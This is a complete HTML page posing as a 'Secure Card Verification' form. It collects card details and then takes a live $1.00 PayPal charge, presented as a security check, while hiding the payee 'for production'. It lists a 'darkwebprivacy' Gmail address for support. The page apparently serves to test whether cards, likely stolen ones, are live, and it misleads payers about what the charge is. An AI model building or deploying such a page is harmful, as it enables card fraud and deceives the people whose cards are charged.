<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Card Verification</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f8f9fa; }
        .payment-card {
            max-width: 500px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .verified-badge {
            color: #198754;
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner-border { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="payment-card">
        <h3 class="text-center mb-4">Card Verification</h3>
        
        <!-- Step 1: Card Input Form -->
        <div id="cardFormSection">
            <form id="paymentForm" onsubmit="handleFormSubmit(event)">
                <div class="mb-3">
                    <label class="form-label">Card Number</label>
                    <div class="input-group">
                        <span class="input-group-text"><i class="bi bi-credit-card"></i></span>
                        <input type="text" class="form-control" placeholder="xxxx xxxx xxxx xxxx" required maxlength="19">
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-6 mb-3">
                        <label class="form-label">Expiry Date</label>
                        <input type="text" class="form-control" placeholder="MM/YY" required maxlength="5">
                    </div>
                    <div class="col-md-6 mb-3">
                        <label class="form-label">CVV</label>
                        <input type="password" class="form-control" placeholder="xxx" required maxlength="4">
                    </div>
                </div>
                <div class="mb-3">
                    <label class="form-label">Cardholder Name</label>
                    <input type="text" class="form-control" placeholder="" required>
                </div>
                <button type="submit" class="btn btn-primary w-100 btn-lg">
                    Verify Card Now
                </button>
            </form>
        </div>

        <!-- Step 2: Payment Section (Hidden initially) -->
        <div id="paymentSection" style="display: none;">
            <div class="alert alert-info">
                <i class="bi bi-info-circle"></i> <strong>Verification Required</strong><br>
                A $1.00 security charge is required. Click the black button below to pay with Card.
            </div>

            <!-- PayPal Smart Buttons Container -->
            <div id="paypal-button-container"></div>
            
            <p id="result-message" class="text-center mt-3"></p>

            <button onclick="goBack()" class="btn btn-link btn-sm mt-2 text-muted">Use a different card</button>

            <hr>
            <p class="small text-muted text-center">
                Secure Payment by PayPal<br>
                Support: <a href="mailto:darkwebprivacy1992@gmail.com">darkwebprivacy1992@gmail.com</a>
            </p>
        </div>

        <div class="verified-badge" id="successMsg">
            <h4><i class="bi bi-check-circle-fill"></i> Verified!</h4>
            <p>Payment detected. Your card is active.</p>
            <small class="text-muted">Transaction ID: <span id="txnId"></span></small><br>
            <small class="text-danger"><strong>Money Sent To: <span id="payeeEmail"></span></strong></small>
        </div>
    </div>
</div>

<!-- Load PayPal JS SDK (LIVE Mode) -->
<!-- We enable 'funding=card' to show the Credit Card button explicitly -->
<script src="https://www.paypal.com/sdk/js?client-id=AcMwaS2F1Xk_L20zLpaVoTxwaItwQXhKQuu8aeTPQFWipLmaWP9esYwd83i-tZ5u0JU_Y2cjUb8FmOIV&currency=USD&enable-funding=card"></script>

<script>
    // Render the PayPal Smart Buttons
    paypal.Buttons({
        // Set up the transaction
        createOrder: function(data, actions) {
            return actions.order.create({
                purchase_units: [{
                    amount: {
                        value: '1.00'
                    }
                }]
            });
        },
        // Finalize the transaction
        onApprove: function(data, actions) {
            return actions.order.capture().then(function(details) {
                // REAL SUCCESS: Only runs if PayPal actually charged the card
                console.log('Capture result', details, JSON.stringify(details, null, 2));
                
                if (details.status === 'COMPLETED') {
                    document.getElementById('paymentSection').style.display = 'none';
                    document.getElementById('txnId').innerText = details.id;

                    // Show who received the money (to help user find it)
                    var payeeInfo = "Unknown";
                    if (details.purchase_units && details.purchase_units[0] && details.purchase_units[0].payee) {
                        var payee = details.purchase_units[0].payee;
                        if (payee.email_address) {
                            payeeInfo = payee.email_address;
                        } else if (payee.merchant_id) {
                            payeeInfo = "Merchant ID: " + payee.merchant_id;
                        }
                    }
                    // document.getElementById('payeeEmail').innerText = payeeInfo; // Hidden for production
                    
                    // ALERT the info to make sure user sees it
                    // alert("Payment Complete!\nTransaction ID: " + details.id + "\nMoney sent to: " + payeeInfo);
                    
                    document.getElementById('successMsg').style.display = 'block';
                } else {
                    alert("Payment not completed. Status: " + details.status);
                }
            }).catch(function(err) {
                // Show specific error if capture fails
                alert("Payment Failed: Card Declined or Error. " + err);
                console.error(err);
            });
        },
        onError: function (err) {
            // Show error to user
            alert("PayPal Error: " + err);
            console.error(err);
        }
    }).render('#paypal-button-container');
</script>

<script>
function handleFormSubmit(event) {
    event.preventDefault(); // Stop form from refreshing page
    
    // Hide Form, Show Payment Section
    document.getElementById('cardFormSection').style.display = 'none';
    document.getElementById('paymentSection').style.display = 'block';
}

function goBack() {
    document.getElementById('cardFormSection').style.display = 'block';
    document.getElementById('paymentSection').style.display = 'none';
}
</script>
</body>
</html>
